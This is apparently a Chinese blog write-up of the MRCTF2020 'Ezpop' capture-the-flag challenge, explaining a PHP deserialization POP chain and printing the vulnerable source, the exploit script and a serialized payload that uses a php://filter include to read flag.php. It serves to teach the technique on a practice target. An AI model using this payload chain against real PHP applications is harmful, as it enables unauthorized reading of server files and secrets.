---

title: php反序列化——pop链2

date: 2021-03-28 20:00:44

tags: 练习

categories: test55

---
今天再复习一道php反序列化的题目，锻炼自己构造pop链的能力。  

# [MRCTF2020]Ezpop  
打开题目，直接就得到了源码。  

	 <?php
	//flag is in flag.php
	//WTF IS THIS?
	//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
	//And Crack It!
	class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
	}

	class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
	}

	class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
	
	
	if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
	}
	else{
    $a=new Show;
    highlight_file(__FILE__);
	}   

代码很长，但是根据我们之前做题的思路，首先就是找到可以执行命令的代码或者函数。  

可以看到在Modifier类中就有一个include()函数，推测我们可以用这个函数来执行include()文件包含漏洞。  

	class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
	}  

可以看到，include()函数里的变量$value是在下面的_invoke()方法中被赋值的，从之前的那道题目中可以知道，如果把一个类的对象当作函数调用，那么就会触发invoke()方法，而这个方法会调用一个自定义的方法，将把保护属性$var传入自定义方法append($value)，也就是将var的值赋予value，所以我们要想执行include()函数，就要给var传入参数。  

那么我们如何触发_invoke()方法呢？这里我们可以看到下面的test类里有可用的函数。  

	class Test{
	public $p;
	function __construct(){
    $this->p = array();
	}

	public function __get($key){
    $function = $this->p;
    return $function();
	}  

很明显，在Test类里的_get()方法会将p的值赋予$function并返回形如函数的形式$function()，而get()方法只会在访问不可访问或者不存在的属性的时候才会触发那么从哪里找一个不存在的属性呢？  

这就要看到Show类了。

	class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
	}

首先可以看到的是这个wakeup()方法，在反序列化开始的时候就会调用这个函数，而这个函数里又有一个正则匹配，匹配的是属性source，**在这里要注意一下，在正则匹配时，是把属性source当作字符串来处理的。**这让我们很容易就联系到上面的tostring_()方法，当一个类对象被当作字符串处理的时候，这个方法就会被返回。这里返回的$this->str->source;指的是返回str属性值的source属性，而这个source属性不正好就是Test类里没有的属性吗？  

所以到了这里我们大致就可以理出pop链了：  

我们首先从Show类开始，先触发wakeup方法，在wakeup的正则匹配中触发tostring方法，我们给str赋值Test()类，这样返回的就是Test类的source属性，而Test类里没有该属性，从而触发了get()方法，在get方法中我们给p赋值为Modifier类，这样最后返回的就是Modifier()，这样就是把类对象当作函数了，从而可以触发invoke()方法，而我们通过上传var参数来利用include()的文件包含漏洞。  

	unserialize()-->__wakeup()-->toString()-->__get()-->__invoke()-->append()-->include()  

我们这样构造  

	<?php
	class Modifier {
	protected  $var="php://filter/read=convert.base64-encode/resource=flag.php";//伪协议利用include()函数漏洞。

	}

	class Test{
    public $p;	
	}

	class Show{
    public $source;
    public $str;
    public function __construct(){
        $this->str = new Test();
    }
	}

	$a = new Show();
	$a->source = new Show();//这里是一个要注意的点，因为tostring()是在wakeup()方法中触发的，而这时匹配的是$source,所以我们要给source赋值show()类以此来进行接下来的tostring()方法。
	$a->source->str->p = new Modifier();//__get返回的p触发__invoke
	echo serialize($a);
	?>
	得到O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:" * var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";O:4:"Test":1:{s:1:"p";N;}}

由于var是protected类型，所以payload中需要用%00把它的位数补齐，或者直接最后url编码输出
最后传入pop得到base64编码，解码即得flag。  

[![](https://img.imgdb.cn/item/6064ac528322e6675cf319a5.png)](https://img.imgdb.cn/item/6064ac528322e6675cf319a5.png)  

解码可得。  

## 小结  
这道题目虽然代码大变样，但是思路不变，依旧是找可以执行命令的语句和能够操控的pop链，只要对魔术方法足够了解，代码审计能力足够强就可以做到。所以说还是要多加练习啊。